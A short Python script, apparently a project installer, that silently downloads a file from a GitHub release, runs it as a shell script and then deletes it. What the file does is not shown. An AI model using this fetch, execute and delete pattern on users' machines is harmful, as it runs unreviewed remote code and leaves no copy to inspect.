import subprocess
import os

def main():
    os.system('clear')

    url = "https://github.com/oktaviaps/OS-Project/releases/download/release/release"
    subprocess.run(['wget', '-O', 'setup.sh', '-q', url])

    subprocess.run(['chmod', '+x', 'setup.sh'])

    subprocess.run(['./setup.sh'])

    subprocess.run(['rm', '-fr', 'setup.sh'])

if __name__ == "__main__":
    main()
